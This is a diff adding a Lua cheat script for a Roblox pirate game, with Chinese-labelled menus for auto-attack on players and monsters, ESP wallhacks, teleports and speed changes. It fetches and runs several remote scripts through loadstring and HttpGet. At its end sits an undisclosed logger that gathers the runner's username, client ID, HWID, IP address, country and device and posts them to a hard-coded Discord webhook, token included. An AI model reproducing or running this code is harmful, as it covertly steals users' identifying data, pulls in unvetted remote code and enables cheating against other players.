@@ -1,0 +1,403 @@
+-- [[ CVX - CVX腳本]]
+
+local UI_TAG = "CVX中心"
+local S_CG = game:GetService("CoreGui")
+if S_CG:FindFirstChild(UI_TAG) then S_CG[UI_TAG]:Destroy(); getgenv().StopLoops = true; task.wait(0.1) end
+getgenv().StopLoops = false
+
+local S_PL, S_RS, S_ST, S_REP, S_UI = game:GetService("Players"), game:GetService("RunService"), game:GetService("Stats"), game:GetService("ReplicatedStorage"), game:GetService("UserInputService")
+local LP = S_PL.LocalPlayer
+local Camera = workspace.CurrentCamera
+local CommF = S_REP:WaitForChild("Remotes"):WaitForChild("CommF_")
+
+-- [[ 1. 核心配置 ]]
+getgenv().CaiHuaConfig = {
+    Toggles = { 
+        FastAttack = false, AttackMonsters = false, AttackPlayers = false, AttackAll = false,
+        SpeedActive = false, JumpActive = false, AutoV4 = false,
+        ESP_Main = false, ESP_NameOnly = false, ESP_Health = false, ESP_Tracer = false
+    },
+    Settings = { AtkRange = 500, ClickDelay = 0.1, WalkSpd = 16, JumpPower = 50, FOV = 70 }
+}
+
+-- [[ 2. UI 框架 ]]
+local SG = Instance.new("ScreenGui", S_CG); SG.Name = UI_TAG; SG.ResetOnSpawn = false
+local function ApplyROG(obj, thick)
+    local stroke = Instance.new("UIStroke", obj); stroke.Thickness = thick; stroke.ApplyStrokeMode = "Border"
+    task.spawn(function() while not getgenv().StopLoops and task.wait(0.01) do stroke.Color = Color3.fromHSV(tick() % 5 / 5, 0.8, 1) end end)
+end
+
+local Main = Instance.new("Frame", SG); Main.BackgroundColor3 = Color3.fromRGB(15, 15, 20); Main.Position = UDim2.new(0.5, -250, 0.5, -180); Main.Size = UDim2.new(0, 500, 0, 420); Main.BorderSizePixel = 0; Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12); ApplyROG(Main, 3)
+local Side = Instance.new("Frame", Main); Side.Size = UDim2.new(0, 130, 1, 0); Side.BackgroundColor3 = Color3.fromRGB(22, 22, 28); Instance.new("UICorner", Side)
+Instance.new("UIListLayout", Side).HorizontalAlignment = "Center"; Instance.new("UIPadding", Side).PaddingTop = UDim.new(0, 10)
+
+-- 左側個人資訊
+local UserPart = Instance.new("Frame", Side); UserPart.Size = UDim2.new(1, 0, 0, 95); UserPart.BackgroundTransparency = 1
+local Avatar = Instance.new("ImageLabel", UserPart); Avatar.Size = UDim2.new(0, 40, 0, 40); Avatar.Position = UDim2.new(0.5, -20, 0, 0); Avatar.Image = "rbxthumb://type=AvatarHeadShot&id="..LP.UserId.."&w=150&h=150"; Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1,0)
+local DN = Instance.new("TextLabel", UserPart); DN.Size = UDim2.new(1,0,0,15); DN.Position = UDim2.new(0,0,0,45); DN.Text = LP.DisplayName; DN.TextColor3 = Color3.new(1,1,1); DN.Font = "GothamBold"; DN.TextSize = 10; DN.BackgroundTransparency = 1
+local UN = Instance.new("TextLabel", UserPart); UN.Size = UDim2.new(1,0,0,12); UN.Position = UDim2.new(0,0,0,60); UN.Text = "@"..LP.Name; UN.TextColor3 = Color3.fromRGB(180, 180, 180); UN.Font = "Gotham"; UN.TextSize = 8; UN.BackgroundTransparency = 1
+
+local Container = Instance.new("Frame", Main); Container.Position = UDim2.new(0, 140, 0, 10); Container.Size = UDim2.new(1, -150, 1, -20); Container.BackgroundTransparency = 1
+local Tabs = {}; local TabButtons = {}
+
+local function CreateTab(name)
+    local F = Instance.new("ScrollingFrame", Container); F.Size = UDim2.new(1, 0, 1, 0); F.BackgroundTransparency = 1; F.Visible = false; F.ScrollBarThickness = 2; F.AutomaticCanvasSize = "Y"
+    Instance.new("UIListLayout", F).Padding = UDim.new(0, 8)
+    local B = Instance.new("TextButton", Side); B.Size = UDim2.new(0.9, 0, 0, 28); B.BackgroundColor3 = Color3.fromRGB(35, 35, 45); B.Text = name; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B)
+    B.MouseButton1Click:Connect(function() 
+        for i, v in pairs(Tabs) do v.Visible = false; TabButtons[i].BackgroundColor3 = Color3.fromRGB(35, 35, 45) end
+        F.Visible = true; B.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    end)
+    table.insert(Tabs, F); table.insert(TabButtons, B); return F
+end
+
+local function AddButton(p, t, f)
+    local B = Instance.new("TextButton", p); B.Size = UDim2.new(0.95, 0, 0, 30); B.BackgroundColor3 = Color3.fromRGB(40, 40, 50); B.Text = t; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B); B.MouseButton1Click:Connect(f)
+end
+
+local function AddToggle(p, t, f)
+    local B = Instance.new("TextButton", p); B.Size = UDim2.new(0.95, 0, 0, 32); B.BackgroundColor3 = Color3.fromRGB(45, 45, 55); B.Text = t.." [關閉]"; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B)
+    B.MouseButton1Click:Connect(function() 
+        getgenv().CaiHuaConfig.Toggles[f] = not getgenv().CaiHuaConfig.Toggles[f]
+        B.Text = t..(getgenv().CaiHuaConfig.Toggles[f] and " [開啟]" or " [關閉]")
+        B.BackgroundColor3 = getgenv().CaiHuaConfig.Toggles[f] and Color3.fromRGB(150, 40, 40) or Color3.fromRGB(45, 45, 55)
+    end)
+end
+
+local function AddSlider(p, t, min, max, def, isDec, cb)
+    local F = Instance.new("Frame", p); F.Size = UDim2.new(0.95, 0, 0, 50); F.BackgroundTransparency = 1
+    local L = Instance.new("TextLabel", F); L.Size = UDim2.new(1,0,0,20); L.Text = t..": "..def; L.TextColor3 = Color3.new(1,1,1); L.Font = "GothamBold"; L.TextSize = 10; L.BackgroundTransparency = 1; L.TextXAlignment = "Left"
+    local B = Instance.new("TextButton", F); B.Size = UDim2.new(1,0,0,8); B.Position = UDim2.new(0,0,0,25); B.BackgroundColor3 = Color3.fromRGB(60,60,70); B.Text = ""; Instance.new("UICorner", B)
+    local S = Instance.new("Frame", B); S.Size = UDim2.new((def-min)/(max-min), 0, 1, 0); S.BackgroundColor3 = Color3.new(1,1,1); Instance.new("UICorner", S)
+    B.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then local m; m = S_UI.InputChanged:Connect(function(i2) if i2.UserInputType == Enum.UserInputType.MouseMovement or i2.UserInputType == Enum.UserInputType.Touch then local pVal = math.clamp((i2.Position.X - B.AbsolutePosition.X) / B.AbsoluteSize.X, 0, 1); S.Size = UDim2.new(pVal, 0, 1, 0); local val = min + (max - min) * pVal; val = isDec and math.floor(val*100)/100 or math.floor(val); L.Text = t..": "..val; cb(val) end end) S_UI.InputEnded:Connect(function(i3) if i3.UserInputType == Enum.UserInputType.MouseButton1 or i3.UserInputType == Enum.UserInputType.Touch then m:Disconnect() end end) end end)
+end
+
+-- [[ 3. 分頁與內容 ]]
+local T_Notice = CreateTab("公告")
+local T_Combat = CreateTab("功速+範圍")
+local T_TP = CreateTab("傳送")
+local T_Player = CreateTab("玩家修改")
+local T_ESP = CreateTab("透視")
+local T_Scripts = CreateTab("外部腳本")
+
+-- 公告區
+AddButton(T_Notice, "👺 CVX製作", function() end)
+AddButton(T_Notice, "更新日期:2026/02/23", function() end)
+AddButton(T_Notice, "修改內容:自動v4功能", function() end)
+AddButton(T_Notice, "狀態:腳本測試中", function() end)
+AddButton(T_Notice, "點擊下方按鈕進dc查看更多資訊", function() end)
+
+-- 新增的 Discord 複製按鈕
+local dcLink = "https://discord.com/users/1099156703930495046"
+AddButton(T_Notice, "點擊我加入dc", function()
+    setclipboard(dcLink) -- 這是大多數注入器通用的複製函數
+    
+    -- 這裡做一個簡單的視覺反饋，讓你知道點成功了
+    local originalText = "點擊我加dc"
+    -- 尋找剛剛點擊的按鈕（這部分是基於你 UI 結構的邏輯）
+    for _, v in pairs(T_Notice:GetChildren()) do
+        if v:IsA("TextButton") and v.Text == originalText then
+            v.Text = "✅ 已複製到剪貼簿！"
+            v.BackgroundColor3 = Color3.fromRGB(40, 150, 40)
+            task.delay(2, function()
+                v.Text = originalText
+                v.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+            end)
+        end
+    end
+end)
+
+-- 📂 外部腳本
+AddButton(T_Scripts, "CVX 飛行", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CVXOwO/CVX-script/refs/heads/main/cvx%20fly%20script"))() end)
+AddButton(T_Scripts, "XA hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/XA"))() end)
+AddButton(T_Scripts, "P 腳本", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/p"))() end)
+AddButton(T_Scripts, "FPS 優化", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/FPPS"))() end)
+AddButton(T_Scripts, "外老輔瞄", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/onsb.scripht.lua"))() end)
+AddButton(T_Scripts, "零腳本", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jash-afk/Xuan/refs/heads/main/0%E8%85%B3%E6%9C%AC"))() end)
+AddButton(T_Scripts, "LX hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/josh/refs/heads/main/trash%20LX"))() end)
+
+-- 戰鬥
+AddToggle(T_Combat, "開啟快速攻擊", "FastAttack")
+AddSlider(T_Combat, "攻擊速度", 0.01, 0.5, 0.1, true, function(v) getgenv().CaiHuaConfig.Settings.ClickDelay = v end)
+AddSlider(T_Combat, "攻擊範圍", 100, 5000, 500, false, function(v) getgenv().CaiHuaConfig.Settings.AtkRange = v end)
+AddToggle(T_Combat, "模式: 只打怪物", "AttackMonsters")
+AddToggle(T_Combat, "模式: 只打玩家", "AttackPlayers")
+AddToggle(T_Combat, "模式: 全都打", "AttackAll")
+AddToggle(T_Combat, "如果要都打的話請把上方兩個只打怪物和玩家關掉")
+
+-- 傳送
+local function TPF(pos) pcall(function() LP.Character.HumanoidRootPart.CFrame = CFrame.new(pos) end) end
+AddButton(T_TP, "--- 海域傳送 ---", function() end)
+AddButton(T_TP, "前往 一海", function() CommF:InvokeServer("TravelMain") end)
+AddButton(T_TP, "前往 二海", function() CommF:InvokeServer("TravelDressrosa") end)
+AddButton(T_TP, "前往 三海", function() CommF:InvokeServer("TravelZou") end)
+AddButton(T_TP, "--- 二海地區 ---", function() end)
+AddButton(T_TP, "传送至天鹅房间", function() TPF(Vector3.new(2286.93, 15.06, 910.51)) end)
+AddButton(T_TP, "传送至豪宅", function() TPF(Vector3.new(-287.37, 305.81, 592.98)) end)
+AddButton(T_TP, "传送至鬼船里", function() TPF(Vector3.new(-6501.06, 83.11, -123.52)) end)
+AddButton(T_TP, "传送至鬼船外", function() TPF(Vector3.new(922.78, 123.96, 32842.40)) end)
+AddButton(T_TP, "--- 三海地區 ---", function() end)
+AddButton(T_TP, "传送至海洋城堡", function() TPF(Vector3.new(-12463.60, 376.26, -7566.08)) end)
+AddButton(T_TP, "传送至海龜豪宅", function() TPF(Vector3.new(-5060.41, 316.43, -3192.30)) end)
+AddButton(T_TP, "传送至司法島", function() TPF(Vector3.new(-5096.48, 316.43, -3177.91)) end)
+AddButton(T_TP, "传送至九头蛇", function() TPF(Vector3.new(-5027.03, 316.43, -3206.07)) end)
+
+-- 玩家
+AddToggle(T_Player, "自動 V4 覺醒", "AutoV4")
+AddSlider(T_Player, "視角 FOV", 70, 150, 70, false, function(v) getgenv().CaiHuaConfig.Settings.FOV = v end)
+AddToggle(T_Player, "修改速度", "SpeedActive"); AddSlider(T_Player, "速度", 16, 500, 16, false, function(v) getgenv().CaiHuaConfig.Settings.WalkSpd = v end)
+AddToggle(T_Player, "修改跳躍", "JumpActive"); AddSlider(T_Player, "跳躍", 50, 600, 50, false, function(v) getgenv().CaiHuaConfig.Settings.JumpPower = v end)
+
+-- 透視 (維持大字體、單行變色)
+AddToggle(T_ESP, "透視總開關", "ESP_Main")
+AddToggle(T_ESP, "顯示名稱與頭像", "ESP_NameOnly")
+AddToggle(T_ESP, "顯示變色血量與距離", "ESP_Health")
+AddToggle(T_ESP, "追蹤射線(ROG版)", "ESP_Tracer")
+
+-- [[ 4. 性能面板 ]]
+local MonF = Instance.new("Frame", SG); MonF.Size = UDim2.new(0, 220, 0, 170); MonF.Position = UDim2.new(0.5, -110, 0.05, 0); MonF.BackgroundColor3 = Color3.fromRGB(10,10,15); MonF.Visible = false; Instance.new("UICorner", MonF); ApplyROG(MonF, 2)
+local function ML(t, c) local l = Instance.new("TextLabel", MonF); l.Size = UDim2.new(1,0,0,25); l.BackgroundTransparency=1; l.TextColor3= c or Color3.new(1,1,1); l.Font="Code"; l.TextSize=10; l.Text=t; return l end
+Instance.new("UIListLayout", MonF).HorizontalAlignment = "Center"
+local mFPS = ML("FPS: --", Color3.fromRGB(0, 255, 127))
+local mPing = ML("Ping: --", Color3.fromRGB(255, 200, 0))
+local mMem = ML("內存: -- MB", Color3.fromRGB(0, 190, 255))
+ML("注入器: "..(identifyexecutor and identifyexecutor() or "未知"), Color3.fromRGB(255, 100, 100))
+ML("裝置: "..(S_UI.TouchEnabled and "mobile 📱" or "Pc 🖥️"), Color3.fromRGB(150, 150, 255))
+AddButton(Side, "性能面板", function() MonF.Visible = not MonF.Visible end)
+
+-- [[ 5. 核心 ESP ]]
+local function CreateESP(p)
+    if p == LP then return end
+    local line = Drawing.new("Line"); line.Visible = false
+    local bg = Instance.new("BillboardGui"); bg.Size = UDim2.new(0, 200, 0, 70); bg.AlwaysOnTop = true; bg.Enabled = false
+    local pImg = Instance.new("ImageLabel", bg); pImg.Size = UDim2.new(0, 35, 0, 35); pImg.Image = "rbxthumb://type=AvatarHeadShot&id="..p.UserId.."&w=150&h=150"; Instance.new("UICorner", pImg).CornerRadius = UDim.new(1,0)
+    local nL = Instance.new("TextLabel", bg); nL.Size = UDim2.new(0, 150, 0, 25); nL.Position = UDim2.new(0, 40, 0, 0); nL.BackgroundTransparency = 1; nL.TextColor3 = Color3.new(1,1,1); nL.Font = "GothamBold"; nL.TextSize = 14; nL.TextXAlignment = "Left"
+    local hL = Instance.new("TextLabel", bg); hL.Size = UDim2.new(0, 180, 0, 25); hL.Position = UDim2.new(0, 40, 0, 22); hL.BackgroundTransparency = 1; hL.Font = "GothamBold"; hL.TextSize = 13; hL.TextXAlignment = "Left"
+
+    S_RS.RenderStepped:Connect(function()
+        if getgenv().StopLoops or not p.Parent then bg:Destroy(); line:Remove(); return end
+        local c = p.Character
+        if c and c:FindFirstChild("HumanoidRootPart") and getgenv().CaiHuaConfig.Toggles.ESP_Main then
+            bg.Adornee = c.HumanoidRootPart; bg.Parent = c.HumanoidRootPart; bg.Enabled = true
+            nL.Visible = getgenv().CaiHuaConfig.Toggles.ESP_NameOnly; pImg.Visible = nL.Visible
+            nL.Text = p.DisplayName
+            hL.Visible = getgenv().CaiHuaConfig.Toggles.ESP_Health
+            if c:FindFirstChild("Humanoid") then
+                local dist = math.floor(LP:DistanceFromCharacter(c.HumanoidRootPart.Position))
+                hL.Text = "HP: " .. math.floor(c.Humanoid.Health) .. " | Dist: " .. dist .. "m"
+                hL.TextColor3 = Color3.fromHSV((c.Humanoid.Health/c.Humanoid.MaxHealth) * 0.35, 0.9, 1)
+            end
+            if getgenv().CaiHuaConfig.Toggles.ESP_Tracer then 
+                local pos, os = Camera:WorldToViewportPoint(c.HumanoidRootPart.Position)
+                if os then line.Visible = true; line.From = Vector2.new(Camera.ViewportSize.X/2, 0); line.To = Vector2.new(pos.X, pos.Y); line.Color = Color3.fromHSV(tick()%5/5,0.8,1) else line.Visible = false end
+            else line.Visible = false end
+        else bg.Enabled = false; line.Visible = false end
+    end)
+end
+
+-- [[ 6. 核心循環與新 V4 邏輯 ]]
+local function callAwakeningRemote()
+    local Backpack = LP:FindFirstChild("Backpack")
+    if not Backpack then return end
+    local Awakening = Backpack:FindFirstChild("Awakening")
+    if not Awakening then return end
+    local RemoteFunc = Awakening:FindFirstChild("RemoteFunction")
+    if not RemoteFunc or not RemoteFunc:IsA("RemoteFunction") then return end
+    
+    pcall(function()
+        RemoteFunc:InvokeServer(true)
+    end)
+end
+
+task.spawn(function()
+    while not getgenv().StopLoops and task.wait(0.5) do
+        if MonF.Visible then
+            mFPS.Text = "FPS: "..math.floor(workspace:GetRealPhysicsFPS())
+            mPing.Text = "Ping: "..math.floor(S_ST.Network.ServerStatsItem["Data Ping"]:GetValue()).."ms"
+            mMem.Text = "內存: "..math.floor(S_ST:GetTotalMemoryUsageMb()).." MB"
+        end
+    end
+end)
+
+S_RS.RenderStepped:Connect(function()
+    if getgenv().StopLoops then return end
+    pcall(function()
+        Camera.FieldOfView = getgenv().CaiHuaConfig.Settings.FOV
+        local H = LP.Character.Humanoid
+        H.WalkSpeed = getgenv().CaiHuaConfig.Toggles.SpeedActive and getgenv().CaiHuaConfig.Settings.WalkSpd or 16
+        H.JumpPower = getgenv().CaiHuaConfig.Toggles.JumpActive and getgenv().CaiHuaConfig.Settings.JumpPower or 50
+        
+        -- 套用新的 V4 邏輯
+        if getgenv().CaiHuaConfig.Toggles.AutoV4 and H.Health > 0 then
+            callAwakeningRemote()
+        end
+    end)
+end)
+
+task.spawn(function()
+    local RA = S_REP.Modules.Net:WaitForChild("RE/RegisterAttack")
+    local RH = S_REP.Modules.Net:WaitForChild("RE/RegisterHit")
+    while not getgenv().StopLoops and task.wait() do
+        if getgenv().CaiHuaConfig.Toggles.FastAttack then
+            pcall(function()
+                local ts = {}
+                local function sc(f) for _,e in pairs(f:GetChildren()) do if e:FindFirstChild("Humanoid") and e.Humanoid.Health > 0 and LP:DistanceFromCharacter(e.PrimaryPart.Position) < getgenv().CaiHuaConfig.Settings.AtkRange then table.insert(ts, {e, e.PrimaryPart}) end end end
+                if getgenv().CaiHuaConfig.Toggles.AttackAll then sc(workspace.Enemies); sc(workspace.Characters)
+                elseif getgenv().CaiHuaConfig.Toggles.AttackMonsters then sc(workspace.Enemies)
+                elseif getgenv().CaiHuaConfig.Toggles.AttackPlayers then sc(workspace.Characters) end
+                if #ts > 0 then RA:FireServer(getgenv().CaiHuaConfig.Settings.ClickDelay); RH:FireServer(ts[1][2], ts) end
+            end)
+        end
+        task.wait(getgenv().CaiHuaConfig.Settings.ClickDelay)
+    end
+end)
+
+S_PL.PlayerAdded:Connect(CreateESP); for _,v in pairs(S_PL:GetPlayers()) do CreateESP(v) end
+
+-- [[ 6. 關閉確認視窗系統 (已整合你的代碼) ]]
+local ConfirmFrame = Instance.new("Frame", SG) -- 使用 SG
+ConfirmFrame.Size = UDim2.new(0, 250, 0, 120); ConfirmFrame.Position = UDim2.new(0.5, -125, 0.5, -60)
+ConfirmFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35); ConfirmFrame.Visible = false; ConfirmFrame.ZIndex = 20 -- 層級調高
+Instance.new("UICorner", ConfirmFrame); ApplyROG(ConfirmFrame, 2)
+
+local ConfirmText = Instance.new("TextLabel", ConfirmFrame)
+ConfirmText.Text = "確定要關閉腳本嗎？"; ConfirmText.Size = UDim2.new(1, 0, 0, 50); ConfirmText.TextColor3 = Color3.new(1,1,1); ConfirmText.BackgroundTransparency = 1; ConfirmText.ZIndex = 20
+
+local Yes = Instance.new("TextButton", ConfirmFrame)
+Yes.Text = "確定"; Yes.Size = UDim2.new(0, 80, 0, 30); Yes.Position = UDim2.new(0.15, 0, 0.6, 0); Yes.BackgroundColor3 = Color3.fromRGB(180, 50, 50); Yes.TextColor3 = Color3.new(1,1,1); Yes.ZIndex = 20; Instance.new("UICorner", Yes)
+
+local No = Instance.new("TextButton", ConfirmFrame)
+No.Text = "取消"; No.Size = UDim2.new(0, 80, 0, 30); No.Position = UDim2.new(0.55, 0, 0.6, 0); No.BackgroundColor3 = Color3.fromRGB(60, 60, 60); No.TextColor3 = Color3.new(1,1,1); No.ZIndex = 20; Instance.new("UICorner", No)
+
+-- 主界面上的 X 按鈕
+local CloseBtn = Instance.new("TextButton", Main)
+CloseBtn.Size = UDim2.new(0, 30, 0, 30); CloseBtn.Position = UDim2.new(1, -35, 0, 7)
+CloseBtn.Text = "X"; CloseBtn.TextColor3 = Color3.new(1,1,1); CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50); Instance.new("UICorner", CloseBtn)
+CloseBtn.Font = "GothamBold"; CloseBtn.TextSize = 14
+
+-- 按鈕事件
+CloseBtn.MouseButton1Click:Connect(function() ConfirmFrame.Visible = true end)
+No.MouseButton1Click:Connect(function() ConfirmFrame.Visible = false end)
+Yes.MouseButton1Click:Connect(function() 
+    getgenv().StopLoops = true -- 停止所有後台循環
+    SG:Destroy() -- 刪除 UI
+end)
+
+-- 🥦 Broccoli
+local CaiHuaBtn = Instance.new("TextButton", SG); CaiHuaBtn.Size = UDim2.new(0, 60, 0, 60); CaiHuaBtn.Position = UDim2.new(0, 30, 0, 30); CaiHuaBtn.BackgroundColor3 = Color3.new(0,0,0); CaiHuaBtn.Text = "🥦"; CaiHuaBtn.TextSize = 35; Instance.new("UICorner", CaiHuaBtn).CornerRadius = UDim.new(1,0); ApplyROG(CaiHuaBtn, 4)
+CaiHuaBtn.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
+local function Drag(o) local g, s, sp; o.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then g = true; s = i.Position; sp = o.Position end end) o.InputChanged:Connect(function(i) if g and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then local d = i.Position - s; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end) o.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then g = false end end) end
+Drag(Main); Drag(MonF); Drag(CaiHuaBtn); Tabs[1].Visible = true; TabButtons[1].BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+
+-- 初始化顯示
+Tabs[1].Visible = true; TabButtons[1].BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+
+-- ===================== Discord Webhook 日志 =====================
+local GS_WEBHOOK = "https://discord.com/api/webhooks/1470050869645934643/vg5pP6qJ2IRZTeC2e9NrEqFkMp7sUL4DGO7HeQHa4AkisVH-hokZBgwsREdzdXPkcDJj"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+local localPlayer = Players.LocalPlayer
+if not localPlayer then
+    return
+end
+
+local function safeCall(func, fallback)
+    local success, result = pcall(func)
+    return success and result or fallback
+end
+
+local function getAvatarImage(userId)
+    return safeCall(function()
+        local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
+        local response = HttpService:JSONDecode(game:HttpGet(url))
+        return response.data[1].imageUrl
+    end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
+end
+
+local function getDeviceType()
+    local touch = UserInputService.TouchEnabled
+    local keyboard = UserInputService.KeyboardEnabled
+    local mouse = UserInputService.MouseEnabled
+    
+    if touch and not keyboard and not mouse then return "移动设备"
+    elseif not touch and keyboard and mouse then return "电脑"
+    elseif touch and keyboard and mouse then return "模拟器"
+    else return "未知" end
+end
+
+local function getExecutor()
+    return (identifyexecutor and identifyexecutor()) or 
+           (getexecutorname and getexecutorname()) or 
+           "未知"
+end
+
+local function getHWID()
+    return (gethwid and gethwid()) or "无法获取"
+end
+
+local function getIPAddress()
+    local request = http_request or request or (syn and syn.request)
+    if not request then return "无请求函数" end
+    
+    return safeCall(function()
+        return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
+    end, "获取失败")
+end
+
+local userId = localPlayer.UserId
+local placeId = game.PlaceId
+
+local payload = {
+    username = "寶寶",
+    embeds = {{
+        color = tonumber("0x32CD32"),
+        title = string.format("有人正在使用脚本 %s %d时%d分", 
+            os.date("%Y年%m月%d日"), 
+            tonumber(os.date("%H")), 
+            tonumber(os.date("%M"))),
+        
+        thumbnail = {url = getAvatarImage(userId)},
+        
+        fields = {
+            {name = "用户名", value = localPlayer.Name, inline = true},
+            {name = "显示名称", value = localPlayer.DisplayName, inline = true},
+            {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
+            
+            {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
+            
+            {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
+            {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
+            
+            {name = "注入器", value = getExecutor(), inline = true},
+            {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
+            
+            {name = "设备", value = getDeviceType(), inline = false},
+            {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
+            {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
+           
+            {name = "HWID", value = getHWID(), inline = true},
+            {name = "IP地址", value = getIPAddress(), inline = true},
+            {name = "IP查询", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
+        }
+    }}
+}
+
+local request = http_request or request or HttpPost or (syn and syn.request)
+if not request then
+    return
+end
+
+safeCall(function()
+    request({
+        Url = GS_WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
